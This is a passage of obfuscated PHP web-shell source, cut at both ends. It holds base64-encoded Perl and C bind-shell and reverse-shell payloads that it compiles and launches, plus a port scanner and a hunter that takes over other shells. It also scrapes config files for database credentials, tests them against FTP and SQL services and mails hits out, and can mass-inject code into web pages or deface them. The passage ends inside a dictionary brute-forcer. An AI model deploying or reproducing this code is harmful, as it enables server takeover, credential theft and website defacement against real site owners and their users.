nNldGVudigiUEFUSCIsICIvc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbjovdXNyL2xvY2FsL2Jpbi86L3Vzci9sb2NhbC9zYmluOi4iLCAxKTsKdW5zZXRlbnYoIkhJU1RTQVZFIik7CnVuc2V0ZW52KCJISVNURklMRSIpOwpleGVjbCgiL2Jpbi9zaCIsICJzaCIsIChjaGFyICopIDApOwpjbG9zZShkKTsKZXhpdCgwKTsKfQp9CnJldHVybiAwOwp9CgppbnQgY2hwYXNzKGNoYXIgKmJhc2UsIGNoYXIgKmVudGVyZWQpIHsKaW50IGk7CmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSAKewppZihlbnRlcmVkW2ldID09ICdcbicpCmVudGVyZWRbaV0gPSAnXDAnOyAKaWYoZW50ZXJlZFtpXSA9PSAnXHInKQplbnRlcmVkW2ldID0gJ1wwJzsKfQppZiAoIXN0cmNtcChiYXNlLGVudGVyZWQpKQpyZXR1cm4gMDsKfQo=";
    $bndprt_pl = "IyEvdXNyL2Jpbi9wZXJsCiRTSEVMTD0iL2Jpbi9zaCI7CiRMSVNURU5fUE9SVD0lcG9ydCU7CnVzZSBTb2NrZXQ7CiRwcm90b2NvbD1nZXRwcm90b2J5bmFtZSgndGNwJyk7CnNvY2tldChTLCZQRl9JTkVULCZTT0NLX1NUUkVBTSwkcHJvdG9jb2wpIHx8IGRpZSAiQ2FudCBjcmVhdGUgc29ja2V0XG4iOwpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7CmJpbmQoUyxzb2NrYWRkcl9pbigkTElTVEVOX1BPUlQsSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7Cmxpc3RlbihTLDMpIHx8IGRpZSAiQ2FudCBsaXN0ZW4gcG9ydFxuIjsKd2hpbGUoMSkKewphY2NlcHQoQ09OTixTKTsKaWYoISgkcGlkPWZvcmspKQp7CmRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsKb3BlbiBTVERJTiwiPCZDT05OIjsKb3BlbiBTVERPVVQsIj4mQ09OTiI7Cm9wZW4gU1RERVJSLCI+JkNPTk4iOwpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsKY2xvc2UgQ09OTjsKZXhpdCAwOwp9Cn0KCg==";
    $bckcon_pl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $bckcon_c = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pCnsKIGludCBmZDsKIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47CiBjaGFyIHJtc1syMV09InJtIC1mICI7IAogZGFlbW9uKDEsMCk7CiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7CiBzaW4uc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMl0pKTsKIHNpbi5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoYXJndlsxXSk7IAogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsyXSkpOyAKIGZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkgOyAKIGlmICgoY29ubmVjdChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmc2luLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSkpPDApIHsKICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7CiAgIGV4aXQoMCk7CiB9CiBzdHJjYXQocm1zLCBhcmd2WzBdKTsKIHN5c3RlbShybXMpOyAgCiBkdXAyKGZkLCAwKTsKIGR1cDIoZmQsIDEpOwogZHVwMihmZCwgMik7CiBleGVjbCgiL2Jpbi9zaCIsInNoIiwgTlVMTCk7CiBjbG9zZShmZCk7IAp9Cgo=";
    $bndportsrcs = array("bndprt.pl" => array("PERL", "perl %path"), "bndprt.c" => array("C", "%path"));
    $bcsrcs = array("bckcon.pl" => array("PERL", "perl %path %host %port"), "bckcon.c" => array("C", "%path %host %port"));
    if (!@isset($brtest1)) {
        $brtest1 = 0;
    }
    if (!@isset($brtest2)) {
        $brtest2 = 0;
    }
    if (!@isset($brtest3)) {
        $brtest3 = 0;
    }
    if (!@isset($brtest4)) {
        $brtest4 = 0;
    }

    $users = array();
    if (@empty($brute_email)) {
        $brute_email = z7x('2', "email");
    }
    if (@empty($dv_email)) {
        $dv_email = z7x('2', "email");
    }
    if (@empty($cp_email)) {
        $cp_email = z7x('2', "email");
    }
    if (@isset($brm) && ($brm == "2" || $brm == "3")) {
        $users = z6m();
    }
    $brute_type["1"] = z9s("343");
    if ($bpasswd) {
        $brute_type["2"] = z9s("344");
        $brute_type["3"] = z9s("345");
    }
    $available_arr = array();
    if ($bftp) {
        $available_arr["FTP"] = "FTP";
    }
    if ($bmysql) {
        $available_arr["MySQL"] = "MySQL";
    }
    if ($bmssql) {
        $available_arr["MSSQL"] = "MSSQL";
    }
    if ($bpostgres) {
        $available_arr["PostgreSQL"] = "PostgreSQL";
    }
    if ($boracle) {
        $available_arr["Oracle"] = "Oracle";
    }
    if (!@isset($brh)) {
        $brh = $saddr;
    }
    if (!@isset($dvfiles)) {
        $dvfiles = "*conf*.php;*db*.php;";
    }
    if (!@isset($dvuser)) {
        $dvuser = "user";
    }
    if (!@isset($dvpass)) {
        $dvpass = "pass";
    }
    if (!@isset($dvhost)) {
        $dvhost = "host";
    }
    if (!@isset($dvbase)) {
        $dvbase = "base";
    }

    $arr_vars = array("var" => "variable (\$var)", "arrayvar1" => "arrayvar ('var'=>)", "arrayvar2" => "arrayvar (['var']=>)", "const" => "constant (define)");
    $rec_arr = array();
    for ($i = 0; $i < 10; $i++) {
        $rec_arr[($i + 1)] = ($i + 1) . " DIRS";
    }

    $rec_arr["no"] = "NO";
    $arr_dvfind = array("dvdir" => z9s("325"));
    $arr_method = array("cpdir" => z9s("304"));
    if (($wwwdir = z3k()) !== false) {
        $arr_dvfind["docroot"] = z9s("326");
        $arr_method["cpdocroot"] = z9s("305");
    }
    if ($bpasswd) {
        $arr_dvfind["passwd"] = z9s("327");
        $arr_method["cppasswd"] = z9s("306");
    }
    $arr_sfuncs = array("glob" => "glob");
    if ($nix && $sh_exec) {
        $arr_sfuncs["find"] = "find";
    }
    $inj_method = array("top" => "Top of the file", "end" => "End of the file", "php1" => "Before first &lt;?", "html1" => "Before &lt;html&gt;", "html2" => "Before &lt;/html&gt;", "body1" => "Before &lt;body.*&gt;", "body2" => "Before &lt;/body&gt;", "php2" => "After last ?&gt;", "body3" => "After &lt;body.*&gt;", "body4" => "After &lt;/body&gt;", "html3" => "After &lt;html&gt;", "html4" => "After &lt;/html&gt;", "overwrite" => "Deface (Overwrite file)");
    if (!@isset($bnd_port) || !@is_numeric($bnd_port)) {
        $bnd_port = z7x('2', 'bind_port');
    }
    if (!@isset($bnd_pass) || @empty($bnd_pass)) {
        $bnd_pass = z7x('2', 'bind_pass');
    }
    if (!@isset($bc_host) || @empty($bc_host)) {
        $bc_host = $yaddr;
    }
    if (!@isset($bc_port) || !@is_numeric($bc_port)) {
        $bc_port = z7x('2', 'backcon_port');
    }

    $bindmsg = $bcmsg = "";
    if (@isset($bindsubmit) && $bindsubmit) {
        $v = $bndportsrcs[$bnd_src];
        if (@empty($v)) {
            $bindmsg = z9s("272");
        } elseif (@fsockopen("localhost", $bnd_port, $errno, $errstr, 0.1)) {
            $bindmsg = z9s("275", $bnd_port);
        } else {
            $w = @explode(".", $bnd_src);
            $ext = $w[@count($w) - 1];
            unset($w[count($w) - 1]);
            $srcpath = $tempdir . @join(".", $w) . "." . @md5(@time()) . "." . $ext;
            $binpath = $tempdir . @join(".", $w) . @md5(@time());
            if ($ext == "pl") {
                $binpath = $srcpath;
            }
            @unlink($srcpath);
            $fp = @fopen($srcpath, "ab+");
            if (!$fp) {
                $bindmsg = z9s("271");
            } else {
                $data = @base64_decode(${@str_replace('.', '_', $bnd_src)});
                $data = @str_replace("%pass%", $bnd_pass, $data);
                $data = @str_replace("%port%", $bnd_port, $data);
                @fwrite($fp, $data, @strlen($data));
                @fclose($fp);
                if ($ext == "c") {
                    $retgcc = z9t("gcc -o " . $binpath . " " . $srcpath);
                    @unlink($srcpath);
                }
                $v[1] = @str_replace("%path", $binpath, $v[1]);
                $v[1] = @str_replace("//", "/", $v[1]);
                $retbind = z9t($v[1] . " > /dev/null &");
                @sleep(5);
                $sock = @fsockopen("localhost", $bnd_port, $errno, $errstr, 5);
                if (!$sock) {
                    $bindmsg = z9s("273", $bnd_port);
                } else {
                    $bindmsg = z9s("274", array($saddr, $bnd_port));
                }
            }
        }
    }
    if (@isset($bcsubmit) && $bcsubmit) {
        $v = $bcsrcs[$bc_src];
        if (@empty($v)) {
            $bcmsg = z9s("272");
        } else {
            $w = @explode(".", $bc_src);
            $ext = $w[count($w) - 1];
            unset($w[count($w) - 1]);
            $srcpath = $tempdir . join(".", $w) . "." . @md5(@time()) . "." . $ext;
            $binpath = $tempdir . join(".", $w) . @md5(@time());
            if ($ext == "pl") {
                $binpath = $srcpath;
            }
            @unlink($srcpath);
            $fp = @fopen($srcpath, "ab+");
            if (!$fp) {
                $bcmsg = z9s("271");
            } else {
                $data = @base64_decode(${str_replace('.', '_', $bc_src)});
                @fwrite($fp, $data, strlen($data));
                fclose($fp);
                if ($ext == "c") {
                    $retgcc = z9t("gcc -o " . $binpath . " " . $srcpath);
                    @unlink($srcpath);
                }
                $v[1] = @str_replace("%path", $binpath, $v[1]);
                $v[1] = @str_replace("%host", $bc_host, $v[1]);
                $v[1] = @str_replace("%port", $bc_port, $v[1]);
                $v[1] = @str_replace("//", "/", $v[1]);
                $retbind = z9t($v[1] . " > /dev/null &");
                $bcmsg = z9s("76", array($bc_host, $bc_port));
            }
        }
    }
    $selecta = $selectb = array();
    foreach ($bndportsrcs as $k => $v) {
        $selecta[$k] = $v[0];
    }
    foreach ($bcsrcs as $k => $v) {
        $selectb[$k] = $v[0];
    }
    if (!$win && ($sh_exec || $safe_exec)) {
        echo z2b(array(z9s("265") . (!@empty($bindmsg) ? " - " . @strtoupper($bindmsg) : ""), z9s("266") . (!@empty($bcmsg) ? " - " . @strtoupper($bcmsg) : "")), '46');
        echo z9m(2) . z7p() . z7k('', '4');
        echo z5c(array("act" => "tools", "d", "bindsubmit" => "1"), z10e(z5n() . z7i(z5t(z9s("267")) . z9j(z6i("bnd_pass", $bnd_pass, '4') . ":" . z6i("bnd_port", $bnd_port, '1') . ":" . z4a("bnd_src", $selecta, '1', 1) . z8v(z9s("268"), '7'))) . z5n(), '2'));
        echo z7g() . z7k('', '46');
        echo z5c(array("act" => "tools", "d", "bcsubmit" => "1"), z10e(z5n() . z7i(z5t(z9s("434")) . z9j(z6i("bc_host", $bc_host, '4') . ":" . z6i("bc_port", $bc_port, '1') . ":" . z4a("bc_src", $selectb, '1', 1) . z8v(z9s("435"), '7'))) . z5n(), "2"));
        echo z7g() . z7u() . z10w();
        $ii = 0;
        if (@is_dir($tempdir)) {
            if ($dh = @opendir($tempdir)) {
                while (($file = @readdir($dh)) !== false) {
                    if (@preg_match('/^(bndprt|bckcon)\.?[a-zA-Z0-9]{32}/', $file)) {
                        if (@isset($clean)) {
                            @unlink($tempdir . $file);
                        } else {
                            $ii++;
                        }
                    }
                }
                @closedir($dh);
            }
        }
        if ($ii != 0) {
            echo z2b(@strtoupper(z9s("269", $ii)) . z5c(array("act" => "tools", "d", "clean" => "1"), z8v(z9s("270"), '7')));
        }
    }
    $pscmsg = '';
    $startscan = 0;
    if (@isset($pscan) && $pscan && !@empty($pscip) && @is_numeric($pscps) && @is_numeric($pscpe)) {
        if ($pscps < 0 || $pscps > 65535 || $pscpe < 0 || $pscpe > 65535) {
            $pscmsg = z9s("280");
        } else {
            $startscan = 1;
        }
    }
    echo z2b(array(z9s("281"), z9s("277") . ($pscmsg != '' ? " : " . $pscmsg : '')), "46");
    if (!@isset($pscip)) {
        $pscip = $saddr;
    }
    if (!@isset($pscps)) {
        $pscps = "0";
    }
    if (!@isset($pscpe)) {
        $pscpe = "65535";
    }

    echo z9m(2) . z7p() . z7k('', '4') . z6d() . z9m('2') . z7z() . z9b("shellhunt", "1") . z9b("act", "tools") . z9b("d") . z7i(z5t(z9s("282")) . z9j(z4a("shaction", array("view" => z9s("284"), "viewall" => z9s("285"), "own" => z9s("286"), "ownall" => z9s("287")), "5", 1) . ":" . z4a("shrecursive", $rec_arr, "1", 1) . z8v(z9s("436"), "7"))) . z7i(z5t(z9s("283")) . z9j(z4a("hsfunc", $arr_sfuncs, "1", 1) . ":" . z5u("shpath", $d, "2"))) . z9z() . z10w() . z6d() . z7g() . z7k('', '46') . z6d() . z9m('2') . z5c(array("act" => "tools", "d", "pscan" => "1"), z7i(z5t(z9s("278")) . z9j(z6i("pscip", $pscip, "4") . ":" . z6i("pscps", $pscps, '1') . "-" . z6i("pscpe", $pscpe, '1') . z8v(z9s("279"), '7')))) . z10w() . z6d() . z7g() . z7u() . z10w();
    if (@isset($shellhunt) && $shellhunt) {
        $glob = $shells = array();
        $glob = z5s($shpath, "*.php", $shrecursive, (($hsfunc == "find") ? true : false));
        if (@count($glob) > 0) {
            $viewall = $rcown = 0;
            switch ($shaction) {
            case 'view':
                $viewall = $rcown = 0;
                break;
            case 'viewall':
                $viewall = 1;
                $rcown = 0;
                break;
            case 'own':
                $viewall = 0;
                $rcown = 1;
                break;
            case 'ownall':
                $viewall = $rcown = 1;
                break;
            default:
                $viewall = $rcown = 0;
                break;
            }
            foreach ($glob as $tmp) {
                if (($ttype = z2y($tmp, $viewall, $rcown)) !== false) {
                    $shells[$tmp] = $ttype;
                }
            }
        }
        if (@count($shells) > 0) {
            if (($wwwdir = z3k()) !== false) {
                $url = z8o();
                $url_a = @parse_url($url);
                if (@isset($url_a["host"])) {
                    $shellhost = $url_a["host"];
                }
            }
            $external = 1;
            echo z2b(z9s("288"), "1") . z9m("2") . z7i(z9j(z9s("292"), "13", "2") . z9j(z9s("293"), "13") . z9j(z9s("294"), "13") . z9j(z9s("295"), "13", "3"));
            $tr = 0;
            foreach ($shells as $shell => $shelltype) {
                $wwwlink = "-";
                if (@isset($shellhost) && @strstr($shell, $wwwdir) !== false) {
                    $wwwlink = z10y('http://' . $shellhost . '/' . @substr($shell, @strlen($wwwdir)) . '"', z9s("296"), "1", 1);
                }
                echo z7i(z9j(z2h($shell), "14", "2") . z9j($shelltype, "14") . z9j($wwwlink, "14") . z9j(z0h($shell, "1") . z5c(array("act" => "f", "ft" => "rcown", "d" => z3p($shell), "f" => z2h($shell)), z8v(z9s("297"), "18"), "1"), "14", "3"), ($tr % 2 ? '0' : '1'));
                $tr++;
            }
            echo z10w();
        }
    }
    if ($startscan) {
        $pscan = z8c($pscip, $pscps, $pscpe);
        if (@!empty($pscan)) {
            echo z2b(z9s("289"));
            echo z6d() . z10e(z7i(z6x(z5w('', '1') . $pscan . z5q())), '2') . z6d();
        }
    }
    echo z2b(array(z9s("298"), z9s("309")), "46");
    echo z9m(2) . z7p() . z7k('', '4') . z6d() . z9m('2') . z7z() . z9b("cpfind", "1") . z9b("act", "tools") . z9b("d") . z7i(z5t(z9s("299")) . z9j(z5u("cphost", "127.0.0.1", "5") . ":" . z5u("cpuser", "root", "4") . ":" . z4a("cpservice", $available_arr, "1", 1))) . z7i(z5t(z9s("300")) . z9j(z5u("cpfiles", "*conf*.php;*db*.php;", "5") . ":" . z4a("cpmethod", $arr_method, "4", 1) . ":" . z4a("cprecursive", $rec_arr, "1", 1))) . z7i(z5t(z9s("301")) . z9j(z4a("csfunc", $arr_sfuncs, "1", 1) . ":" . z5u("cpdir", $d, "2"))) . ($bmail ? z7i(z5t(z9s("302")) . z9j(z5u("cp_email", "", '2') . z9g("cp_log"))) : '') . z7i(z5t(z9c()) . z9j(z8v(z9s("307"), "7") . z9c() . z5y("cppassfile", z9s("303"), "cppassfile"))) . z9z() . z10w() . z6d() . z7g() . z7k('', '46') . z6d() . z9m('2') . z7z() . z9b("inject", "1") . z9b("act", "tools") . z9b("d") . z7i(z5t(z9s("310")) . z9j(z5u("injfiles", "*.html;index.php;", "5") . ":" . z4a("injmethod", $inj_method, "4", 1) . ":" . z4a("injrecursive", $rec_arr, "1", 1))) . z7i(z5t(z9s("311")) . z9j(z4a("isfunc", $arr_sfuncs, "1", 1) . ":" . z5u("injdir", $d, "2"))) . z9f(z5t(z9s("312")) . z9j(z5w("injcode", "6") . (@isset($injcode) ? @htmlspecialchars($injcode) : '') . z5q())) . z7i(z5t(z9c()) . z9j(z8v(z9s("313"), "7"))) . z9z() . z10w() . z6d() . z7g() . z7u() . z10w();
    if (@isset($inject) && $inject) {
        $glob = array();
        $glob = z5s($injdir, $injfiles, $injrecursive, (($isfunc == "find") ? true : false));
        if (@count($glob) > 0) {
            $i = 0;
            foreach ($glob as $file) {
                if (z4i($injcode, $injmethod, $file)) {
                    if ($i == 0) {
                        echo z2b(z9s("314")) . z6d() . z9m("2") . z6g() . z6w() . z5w('', '1');
                        z5p();
                    }
                    echo $file . "\r\n";
                    $i++;
                }
            }
            if ($i > 0) {
                echo z5q() . z7g() . z7u() . z10w() . z6d();
            }
        }
    }
    if (@isset($cpfind) && $cpfind && (!@empty($cpuser) || $cpmethod == "cppasswd")) {
        echo z2b(z9s("308")) . z6d();
        echo z9m('2') . z7p() . z6w() . z5w("", "1");
        z5p();
        $glob = array();
        switch ($cpmethod) {
        case 'cpdir':
            $glob[$cpuser] = z5s($cpdir, $cpfiles, $cprecursive, (($csfunc == "find") ? true : false));
            break;
        case 'cpdocroot':
            $glob[$cpuser] = z5s(z1a($wwwdir), $cpfiles, $cprecursive, (($csfunc == "find") ? true : false));
            break;
        case 'cppasswd':
            $uarr = z6m(1);
            if (@count($uarr) > 0) {
                foreach ($uarr as $uk => $arr) {
                    if ($arr[1] != '/' && !@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#', $arr[1]) && z4j($arr[1])) {
                        $glob[$arr[0]] = z5s(z1a($arr[1]), $cpfiles, $cprecursive, (($csfunc == "find") ? true : false));
                    }
                }
            }
            unset($uarr);
            break;
        default:
            break;
        }
        if (@count($glob) > 0) {
            foreach ($glob as $user => $file_arr) {
                if (@count($file_arr) > 0) {
                    foreach ($file_arr as $tfile) {
                        z1m($tfile, $user);
                    }
                }
            }
        }
        $log = '';
        $found = 0;
        if (@isset($passarray) && @count($passarray) > 0) {
            foreach ($passarray as $user => $passwords) {
                if (@count($passwords) > 0) {
                    foreach ($passwords as $pass) {
                        if (@isset($cppassfile) && $cppassfile) {
                            echo "$user $pass\r\n";
                        } else {
                            if (!@isset($stop)) {
                                $stop = 0;
                            }
                            if ($cpservice == "FTP" && $bftp && !$stop) {
                                $test = z3h($cphost, $user, $pass, 21, 3);
                                if ($test == "failed") {
                                    $stop = 1;
                                } elseif ($test == "valid") {
                                    $found++;
                                    $tmp = "host: $cphost\r\n";
                                    $tmp .= "user: $user\r\n";
                                    $tmp .= "pass: $pass\r\n";
                                    $tmp .= "service: $cpservice\r\n\r\n";
                                    echo $tmp;
                                    $log .= $tmp;
                                }
                            } else {
                                if (z4u($cphost, $user, $pass, '', $cpservice) == "valid") {
                                    $found++;
                                    $tmp = "host: $cphost\r\n";
                                    $tmp .= "user: $user\r\n";
                                    $tmp .= "pass: $pass\r\n";
                                    $tmp .= "service: $cpservice\r\n\r\n";
                                    echo $tmp;
                                    $log .= $tmp;
                                }
                            }
                        }
                    }
                }
            }
        }
        if ($cp_log == "1" && $found > 0 && $bmail) {
            @mail($cp_email, "$cpservice|$cphost", $log);
        }
        echo z5q() . z7u() . z7g() . z10w() . z6d();
    }
    $arr_cfgs = array('' => "Select Software", "joomla" => "Joomla", "opencart" => "Opencart", "osc" => "Oscommerce", "pinnaclecart" => "Pinnaclecart", "squirrelcart" => "Squirrelcart", "wordpress" => "Wordpress", "xcart" => "X-cart", "zencart" => "Zen-cart", "all" => "All of above");
    if (@isset($sqlfind) && $sqlfind && @isset($dvdefined) && !@empty($dvdefined) && @isset($dvpasswd) && !@empty($dvpasswd)) {
        $dvcfgs = "nVrkA0mFRDYCHunZ3cN9mLz5pNShsm0r8L4drmb0FTMSPnfIqA4j+Uq6gfLYuldrtsMMNTgK5UoZ3ViSZ5jne7teFyngMstdNqjRBr1NSDZgOnhkT05Hm25ikOaooEva9Wc965VdcbUYpnqs8xq5VDaKeBpRkS1VAxaLTKOr899pfM1pm/v7Rdctk4H0A4bXSxn5Lup5HAdjjl1EzocQXar6WsYumziDYD/EOBgmBiNVl/+kGwfPs64vQfzVuttfcY7tizzenPmMJgE8BGj2AZuXWtxnl3UO4CAPBOdtwkrv+PwMsYhffkEyh17eC3BufrqDkWAQhECUhs8dnp1R0g5/ByuJMebTOe9qwpDDh5goXgYhtjTthSEu4XShBdKNHg+ve/4/QhiJb0hSq8ezOZHCmW1PZ/0gyrywZx2aucGJeCZx3mxnfjiKAGHcnJaiFDV09dXZRuvfGe6SGiPq84bErZThDHORRs5Fz8NivUxj9m+WW7QRtak8EOUiIcTlbPIP85XIWob21V3v83fAAOAr9oJUJJ8gpdfqOLIyJyfa5Kvas2O1DHnvqoS6GsEGGrfnlXHoTeiw47nGeR4SoC7BFPu0hM3hnC4QPR8jrI7D5xYYO3wzK4uhJU4f5Ot8GuqNTsjE1LTyuBqJbeY4I5tcmQLsFYmqyGEQXP4NDExH7OlBMKSlpVkMEeLtouWDMdeAhiYiyWM20jy2VJi5xiQevlBfG/briKFxmCwNdmF2JexxL6qlRGn+Rdx9VYGFot2rxR7y2JTeViten/QNci1L4xAWoHaT1EMCd0zxP/ZYRcBgvzt4326NG1WBspNY6SeSnbBQvPoMcrnOjXHrARy1NyzAUHGhtWeBoFAlShuSA2c4cqGEQTrs1PPKxpTbBacuNLMmm+wvMNvBhdt2HTfZTjdYyEn0qEfOVPTWb8LWPKWxA/zIJ5OYeVH69g0b4CPNknHes4yNY6D7RxK905EY0DMMI1h8HY1n7r7ZvWd84O3VBf904vQUILRA/vhyRb7oKUHttyCruZoG4lgAQGg78PHaYugtc9SFu7Pq41Cn";
        $ddcfgs = zrc4::zdec(@md5($dvpasswd), @base64_decode($dvcfgs));
        if ($dvdefined == "all") {
            $arr_mass = array();
            $arr_mass_paths = array();
            foreach ($arr_cfgs as $tcfg => $tsoft) {
                if ($tcfg != '' && $tcfg != "all") {
                    $tddcfg = @explode("|" . $tcfg . "|", $ddcfgs);
                    $tddcfg = @substr($tddcfg[1], 0, @strpos($tddcfg[1], "|"));
                    @list($tdvuser, $tdtuser, $tdvpass, $tdtpass, $tdvbase, $tdtbase, $tdvhost, $tdthost, $tdvfiles) = @explode(",", $tddcfg);
                    $arr_mass[$tsoft] = array($tdvuser, $tdtuser, $tdvpass, $tdtpass, $tdvbase, $tdtbase, $tdvhost, $tdthost);
                    $tefiles = @explode(";", $tdvfiles);
                    foreach ($tefiles as $tefile) {
                        $tefile = @trim($tefile);
                        if (!@empty($tefile) && !@in_array($tefile, $arr_mass_paths)) {
                            $arr_mass_paths[] = $tefile;
                        }
                    }
                }
            }
        } else {
            if (@strpos($ddcfgs, "|" . $dvdefined . "|") !== false) {
                $ddcfg = @explode("|" . $dvdefined . "|", $ddcfgs);
                $ddcfg = @substr($ddcfg[1], 0, @strpos($ddcfg[1], "|"));
                @list($dvuser, $dtuser, $dvpass, $dtpass, $dvbase, $dtbase, $dvhost, $dthost, $dvfiles) = @explode(",", $ddcfg);
            }
        }
    }
    echo z2b(array(z9s("315"), z9s("337")), '46');
    echo z9m(2) . z7p() . z7k('', '4') . z6d() . z9m('2') . z7z() . z9b("sqlfind", "1") . z9b("act", "tools") . z9b("d") . z7i(z5t(z9s("316")) . z9j(z5u("dvuser", "", "5") . ":" . z4a("dtuser", $arr_vars, "4", 1) . z9c() . z9s("328"))) . z7i(z5t(z9s("317")) . z9j(z5u("dvpass", "", "5") . ":" . z4a("dtpass", $arr_vars, "4", 1) . z9c() . z9s("328"))) . z7i(z5t(z9s("318")) . z9j(z5u("dvbase", "", "5") . ":" . z4a("dtbase", $arr_vars, "4", 1) . z9c() . z9s("329"))) . z7i(z5t(z9s("319")) . z9j(z5u("dvhost", "", "5") . ":" . z4a("dthost", $arr_vars, "4", 1) . z9c() . z9s("329"))) . z7i(z5t(z9s("320")) . z9j(z4a("dvdefined", $arr_cfgs, "5", 1) . ":" . z5u("dvpasswd", "", "4") . z9c() . "anti-lamerz :)")) . z7i(z5t(z9s("321")) . z9j(z5u("dvfiles", "", "5") . ":" . z4a("dvfind", $arr_dvfind, "4", 1) . ":" . z4a("dtrecursive", $rec_arr, "1", 1))) . z7i(z5t(z9s("322")) . z9j(z4a("dsfunc", $arr_sfuncs, "1", 1) . ":" . z5u("dvdir", $d, "2"))) . ($bmail ? z7i(z5t(z9s("302")) . z9j(z5u("dv_email", "", '2') . z9g("dv_log"))) : '') . z7i(z5t(z9c()) . z9j(z8v(z9s("323"), "7") . z9c() . z5y("dvsqltest", z9s("324"), "dvsqltest"))) . z9z() . z10w() . z6d() . z7g() . z7k('', '46') . z6d() . z9m('2') . z7z() . z9b("startbrute", "1") . z9b("act", "tools") . z9b("d") . z7i(z5t(z9s("338")) . z9j(z5u("brh", "", "4") . ":" . z5u("brp", "", "6") . ":" . z4a("bservice", $available_arr, "4", 1))) . z7i(z5t(z9s("339")) . z9j(z5u("bru", "", '4') . ":" . z5u("brdb", "", '5'))) . z7i(z5t(z9s("340")) . z9j(z9h("wordlist", '2'))) . z7i(z5t(z9s("341")) . z9j(z4a("brm", $brute_type, '2', 1))) . z7i(z5t(z9s("342")) . z9j(z5y("brtest1", "user:resu", "brtest1") . z9c(1) . z5y("brtest2", "user:user1", "brtest2") . z9c(1) . z5y("brtest3", "user:user123", "brtest3"))) . z7i(z5t(z9c()) . z9j(z5y("brtest4", "Transform password to p@55w0rd", "brtest4"))) . ($bmail ? z7i(z5t(z9s("302")) . z9j(z6i("brute_email", $brute_email, '2') . z9g("brute_log"))) : '') . z7i(z5t(z9c()) . z9j(z8v(z9s("346"), "7"))) . z9z() . z10w() . z6d() . z7g() . z7u() . z10w();
    if (@isset($startbrute) && $startbrute) {
        $stop = 0;
        echo z2b(z9s("347", $bservice, 1)) . z6d();
        echo z9m('2') . z7p() . z6w() . z5w("", "1");
        z5p();
        $con = true;
        $show = 0;
        $log = "";
        if ($bservice == "FTP") {
            $brp = (@preg_match("/^[0-9]{1,5}$/", $brp) ? $brp : "21");
        } elseif ($bservice == "MySQL") {
            $brp = (@preg_match("/^[0-9]{1,5}$/", $brp) ? $brp : "3306");
        }
        if ($brm == "1" || $brm == "3") {
            $dictionary = array();
            $list = @fopen($_FILES['wordlist']['tmp_name'], 'r');
            if (@is_resource($list)) {
                while (!@feof($list)) {
                    $dictionary[] = @trim(@fgets($list));
                }
                @fclose($list);
            }
            $dictionary = @array_unique($dictionary);
        }
        if ($bservice == "FTP" && $bftp) {
            $time = 3;
            $success = 0;
            $count = 0;
            if (!@empty($bru) && !$stop) {
                $test = z2t($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $bru);
                if (!$test) {
                    $stop = 1;
                }

                z2w($test[0], $test[1], $test[2]);
            }
            if (($brm == "2" || $brm == "3") && !$stop) {
                foreach ($users as $user) {
                    $test = z2t($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $user);
                    if (!$test) {
                        $stop = 1;
                        break;
                    }
                    z2w($test[0], $test[1], $test[2]);
                    if ($brm == "3") {
                        foreach ($dictionary as $passwd) {
                            $test = z2t($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $user, $passwd);
                            z2w($test[0], $test[1], $test[2]);
                        }
                    }
                }
            } else if ($brm == "1" && !@empty($bru) && !$stop) {
                foreach ($dictionary as $passwd) {
